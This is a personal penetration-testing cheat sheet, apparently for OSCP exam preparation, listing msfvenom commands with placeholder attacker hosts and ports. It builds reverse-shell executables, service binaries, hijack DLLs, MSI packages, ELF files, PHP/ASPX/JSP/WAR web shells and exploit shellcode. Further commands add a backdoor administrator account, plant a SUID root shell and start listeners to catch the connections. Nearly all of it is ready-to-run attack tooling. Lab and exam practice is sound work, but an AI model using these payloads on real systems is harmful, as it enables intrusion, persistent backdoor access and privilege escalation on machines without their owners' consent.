# msfvenom payloads

- [ ] OSCP one-target limit: a Meterpreter payload below spends my one Metasploit target, even if the attack fails; msfvenom and multi/handler by themselves are allowed on all targets

## Before I build one
uname -m
systeminfo | findstr /B /C:"System Type"
- [ ] The payload's architecture matches the target and the process: x64 into a 32-bit process fails silently
- [ ] Stageless, shell_reverse_tcp with an underscore, is caught by nc
- [ ] Staged, shell/reverse_tcp and every meterpreter/, needs multi/handler with the same payload
- [ ] Defender flags default msfvenom output, encoder or not
- [ ] Each file into the target's upload/ folder, then fetched with the line serve files gives

## Windows programs
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell32.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meter.exe
A service program, for :Pb services:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o svc.exe
A DLL to hijack:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o hijack.dll
An MSI, for AlwaysInstallElevated:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o setup.msi
msiexec /quiet /qn /i C:\Users\Public\setup.msi

## Linux programs
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell86.elf
On the target:
chmod +x /dev/shm/shell.elf
/dev/shm/shell.elf

## Web payloads
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
- [ ] shell.php opens with <?php, added by hand when it does not
- [ ] shell.war deployed in Tomcat's manager, then browsed to at <Scheme>://<WebHost>/shell/

## A command instead of a shell
A local administrator, from a program that runs as SYSTEM:
msfvenom -p windows/x64/exec CMD='cmd.exe /c net user pwn Pwned123! /add && net localgroup administrators pwn /add' -f exe -o adduser.exe
msfvenom -p linux/x64/exec CMD='cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' -f elf -o suid.elf
- [ ] Then /tmp/rootbash -p on Linux; on Windows, RDP as pwn, or runascs's RunasCs.exe from my shell

## Shellcode for an exploit
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00' -f c
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00' -f raw -o shellcode.bin
xxd -i shellcode.bin > shellcode.h
- [ ] -b lists every bad character the exploit names, \x00 included
- [ ] -v matches the variable name the exploit uses
- [ ] EXITFUNC=thread keeps the service alive after the shell, so I can run it again
- [ ] Encoders such as x86/shikata_ga_nai are for bad characters on x86, not for getting past antivirus

## Catch it
rlwrap nc -lvnp <LPORT>
A staged or Meterpreter payload, with the payload set exactly as built:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set ExitOnSession false; run -j"
- [ ] More on the handler and sessions: :Pb metasploit

## Look one up
msfvenom -l payloads | grep -i windows/x64
msfvenom -l formats
msfvenom -p windows/x64/shell_reverse_tcp --list-options
